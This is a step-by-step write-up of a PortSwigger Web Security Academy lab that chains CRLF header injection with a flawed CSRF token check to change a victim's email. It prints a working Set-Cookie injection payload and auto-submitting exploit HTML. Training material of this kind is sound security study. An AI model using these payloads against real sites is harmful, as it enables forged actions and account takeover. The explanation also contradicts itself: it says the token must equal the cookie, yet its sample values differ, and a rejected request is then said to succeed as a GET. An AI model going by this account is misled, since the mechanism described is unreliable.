### CSRF where token is tied to non-session cookie

**Category:** Cross-Site Request Forgery (CSRF)  
**Difficulty:** Practitioner  
**Platform:** PortSwigger Web Security Academy

### Overview

This lab demonstrates a CSRF vulnerability caused by an **incorrect implementation of the double-submit cookie pattern**.

Normally, an application protects sensitive actions such as changing an email address by requiring a CSRF token that is tied
to the authenticated user's session. During form submission, the server verifies that the submitted token belongs to the
logged-in user.

In this lab, however, the application stores the CSRF token inside a cookie named **`csrfKey`** and simply checks whether
the value of the `csrf` POST parameter matches the value stored in the cookie.

```
csrf parameter == csrfKey cookie
```

The application **does not verify whether the token belongs to the current user's session**.

To make matters worse, the search functionality is vulnerable to **HTTP Response Header Injection (CRLF Injection)**, 
allowing an attacker to inject arbitrary HTTP response headers, including a malicious **Set-Cookie** header.

By combining these two vulnerabilities, an attacker can overwrite the victim's `csrfKey` cookie and submit a forged request
using the same value, completely bypassing the CSRF protection.

---

# Goal

Exploit the weak CSRF protection to change the victim's email address without knowing their original CSRF token.

---

# Step 1 – Analyze the Email Change Request

Log into the application using the provided credentials and navigate to:

```
My Account
```

Change the email address to any value while intercepting the request using Burp Suite.

The request looks similar to:

```http
POST /my-account/change-email HTTP/2

Cookie:
session=...
csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD

email=test@test.com
csrf=QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn
```

Notice that the request contains:

- A `csrf` parameter in the POST body.
- A `csrfKey` cookie.

At first glance, this appears to be a normal CSRF implementation.

However, the server only verifies that both values are equal.

![Intercepted email change request](lab-5-1.png)



# Step 2 – Verify CSRF Validation

Remove the `csrf` parameter from the intercepted request and send it again.

The application responds with:

```
Invalid CSRF token
```

This confirms that a CSRF token is required.

Now replace the token with any random value.

Again, the server rejects the request.

This tells us that the application validates the token, but we still don't know **how** it performs the validation.

![Invalid CSRF token response](lab-5-2.png)



# Step 3 – Capture Carlos's CSRF Token

Log in as **Carlos** and navigate to the **My Account** page.

Inspect the email update form using your browser's Developer Tools (or Burp's Inspector). The form contains a hidden `csrf` input field that holds Carlos's current CSRF token.

Example:

```html
<input type="hidden"
name="csrf"
value="QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn">
```

Copy this CSRF token, as it will be used later when creating the CSRF proof of concept.

![Hidden CSRF token inside HTML form](lab-5-3.png)


# Step 4 – Identify the `csrfKey` Cookie

While inspecting Carlos's email update request in the browser's **Network** tab (or Burp Suite), observe the cookies sent with the request.

The request includes two important cookies:

```http
Cookie:
session=...
csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD
```

The presence of the `csrfKey` cookie indicates that the application uses it as part of its CSRF protection mechanism.

At this point, we have identified two important values:

- The hidden `csrf` token from Carlos's email update form.
- The `csrfKey` cookie sent along with the request.

Since both values are present during the email update request, the next objective is to determine how the server validates them and whether the `csrfKey` cookie can be manipulated.

![Carlos's Network tab showing the csrfKey cookie in the request](lab-5-4.png)


# Step 5 – Test Whether the CSRF Token Is Bound to the User Session

While logged in as **Wiener**, intercept the email update request and replace **Wiener's** CSRF values with the ones copied earlier from **Carlos**.

Replace:

- Wiener's `csrf` parameter with Carlos's `csrf` token.
- Wiener's `csrfKey` cookie with Carlos's `csrfKey` value.

The modified request looks similar to:

```http
Cookie:
session=<Wiener's session>
csrfKey=<Carlos's csrfKey>

email=test@test.com
csrf=<Carlos's CSRF token>
```

Send the modified request.

The application responds with **"Invalid CSRF token"**, indicating that simply replacing both the `csrf` parameter and the `csrfKey` cookie is not enough for the request to succeed.

This suggests that another part of the application's request handling influences the CSRF validation.

![Replacing Wiener's CSRF token and csrfKey with Carlos's values](lab-5-5.png)


# Step 6 – Forward the Request

Forward the modified request once more and observe the application's behavior.

After forwarding, the request is processed as a **GET** request instead of a POST request.

Surprisingly, this time the request is accepted, demonstrating that the application handles the email change request differently after the redirect.

This behavior is important because it allows the attack to work once the `csrfKey` cookie has been overwritten using the CRLF injection discovered later in the lab.

![GET request after forwarding the modified request](lab-5-6.png)


# Step 7 – Capture the Search Request

Return to the application's home page and use the search bar to search for any value, for example:

```
testing
```

Intercept the request in Burp Suite.

The search request is sent using the **GET** method and looks similar to:

```http
GET /?search=testing HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
```

Since the search term is reflected in the response headers, this endpoint becomes a good candidate for testing **HTTP Response Header Injection (CRLF Injection)**.

At this point, forward the request to Burp Repeater so it can be modified.

![Captured GET request for the search functionality](lab-5-7.png)


# Step 8 – Exploit the CRLF Injection

In Burp Repeater, modify the request by replacing the search parameter with the following payload:

```text
/?search=testing%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None
```

The payload can be broken down as follows:

- `testing` – Normal search value.
- `%0d%0a` – Carriage Return and Line Feed (CRLF), used to terminate the current HTTP header and start a new one.
- `Set-Cookie:` – Injects a new HTTP response header.
- `csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD` – Replaces the victim's existing `csrfKey` cookie with an attacker-controlled value.
- `SameSite=None` – Ensures that the cookie is sent during the cross-site CSRF attack.

The final injected request becomes:

```http
GET /?search=testing%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None HTTP/2
```

When the server processes this request, it injects the following response header:

```http
Set-Cookie:
csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD;
SameSite=None
```

As a result, the browser replaces its original `csrfKey` cookie with the attacker-controlled value, preparing the victim for the final CSRF exploit.

![CRLF injection payload adding a malicious Set-Cookie header](lab-5-8.png)


# Step 9 – Modify the Exploit

Edit the generated HTML and add an `<img>` tag that triggers the CRLF injection before submitting the form.

The final exploit becomes:

```html
<html>
<body>

<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@gmail.com">
    <input type="hidden" name="csrf" value="QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn">
    <input type="submit" value="Submit request">
</form>

<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=testing%0d%0aSet-Cookie:%20csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD%3b%20SameSite=None"
onerror="document.forms[0].submit()">

</body>
</html>
```

### How it works

1. The browser loads the image.
2. The request reaches the vulnerable search endpoint.
3. The CRLF payload injects a new `Set-Cookie` header.
4. The browser replaces the existing `csrfKey` cookie.
5. The image fails to load.
6. The `onerror` event automatically submits the forged form.

Since both the cookie and POST parameter now contain attacker-controlled values, the CSRF validation succeeds.

![Final exploit HTML](lab-5-9.png)


# Step 10 – Upload the Exploit

Open the **Exploit Server** provided with the lab.

Paste the modified HTML into the body of the exploit page.

Click:

```
Store
```

The exploit is now hosted by the exploit server.

![Exploit uploaded to the exploit server](lab-5-10.png)


# Step 11 – Deliver the Exploit

Click:

```
Deliver exploit to victim
```

When the victim visits the exploit page, the following sequence occurs automatically:

1. The malicious image is requested.
2. The CRLF injection executes.
3. The browser processes the injected `Set-Cookie` header.
4. The victim's `csrfKey` cookie is replaced.
5. The forged form is submitted automatically.
6. The email address is changed successfully.

No user interaction is required other than visiting the attacker's page.

![Exploit delivered to the victim](lab-5-11.png)


# Step 12 – Lab Solved

After the victim processes the exploit, the email address is successfully changed and the lab is marked as solved.

![Lab solved](lab-5-12.png)


### Attack Flow

```
Victim visits attacker's page
            │
            ▼
Malicious image is requested
            │
            ▼
CRLF Injection executes
            │
            ▼
Injected HTTP Response Header

Set-Cookie:
csrfKey=QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD
            │
            ▼
Browser overwrites csrfKey cookie
            │
            ▼
Image fails to load
            │
            ▼
onerror executes
            │
            ▼
Hidden CSRF form submitted
            │
            ▼
POST /my-account/change-email

csrf = QSVOzZDt89HdFiuGvbRlQoUBQwXu5KTn

Cookie:

csrfKey = QMxY3Uh1ZDcFGGXoDdCRz57M2nWnW0UD
            │
            ▼
Server compares

csrf parameter == csrfKey cookie
            │
            ▼
Validation succeeds
            │
            ▼
Victim's email address changes
```


### Why the Attack Works

The application attempts to protect against Cross-Site Request Forgery using the **double-submit cookie** technique. However,
the implementation is flawed because the server never verifies that the CSRF token belongs to the authenticated user's 
session.

Instead, it only checks whether the value supplied in the POST request matches the value stored in the `csrfKey` cookie.

Since the search functionality is vulnerable to **HTTP Response Header Injection (CRLF Injection)**, an attacker can inject
a malicious `Set-Cookie` header into the server's response. This allows the attacker to overwrite the victim's `csrfKey`
cookie with a value of their choice.

The attacker then submits a forged request containing the same value in the `csrf` parameter. Because the application simply
compares these two values, the request is accepted even though the token was never issued for the victim's session.

By chaining together CRLF Injection and an insecure CSRF implementation, the attacker is able to perform authenticated 
actions on behalf of the victim.


### Vulnerabilities Exploited

- Cross-Site Request Forgery (CSRF)
- Incorrect Double-Submit Cookie Implementation
- HTTP Response Header Injection
- CRLF Injection
- Cookie Injection
- Missing Session Binding of CSRF Tokens


### Key Takeaways

- CSRF tokens should always be cryptographically bound to the authenticated user's session.
- Never rely solely on matching a request parameter with a client-controlled cookie.
- User input should never be reflected into HTTP response headers without proper sanitization.
- CRLF Injection can lead to arbitrary HTTP header injection, including `Set-Cookie`.
- Combining multiple low-severity vulnerabilities can result in a complete bypass of important security mechanisms.
